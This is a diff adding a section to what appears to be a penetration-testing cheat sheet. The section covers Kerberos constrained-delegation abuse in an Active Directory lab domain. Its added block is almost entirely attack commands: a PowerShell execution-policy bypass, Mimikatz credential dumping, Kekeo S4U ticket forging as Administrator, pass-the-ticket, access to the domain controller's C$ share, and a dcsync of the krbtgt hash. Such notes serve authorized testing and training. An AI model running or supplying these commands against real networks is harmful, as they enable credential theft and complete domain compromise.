@@ -594,6 +594,32 @@ invoke-command -Computername dc.pentesting.local -ScriptBlock{whoami;hostname}
 Enter-PSSession -ComputerName dc.pentesting.local
 ```
 
+### msds-allowedtodelegateto <time/...>
+```
+powershell -ep bypass
+Import-Module .\PowerView
+Get-DomainComputer -TrustedToAuth  #search a computer student
+
+.\invoke-Mimikatz
+invoke-Mimikatz
+#sekurlsa::logonpasswords
+#Get 
+
+https://github.com/gentilkiwi/kekeo/releases
+.\kekeo.exe 
+# tgt::ask /user:student$ /domain:pentesting.local /rc4:NTLM_student$
+#Get .kirbi
+# tgs::s4u /tgt:<.kirbi> /user:Administrator@pentesting.local /service:time/ad.pentesting.local | ldap/ad.pentesting.local
+#Get TGS
+
+.\invoke-Mimikatz
+invoke-Mimikatz -Command '"kerberos::ptt TGS_Admin.kirbi"'
+dir \\dc\C$
+invoke-Mimikatz -Command '"lsadump::dcsync /user:pentesting\krbtgt"'
+#Get Hash
+# attack pth
+```
+
 ### Priv Groups of member
 ```
 whoami /all
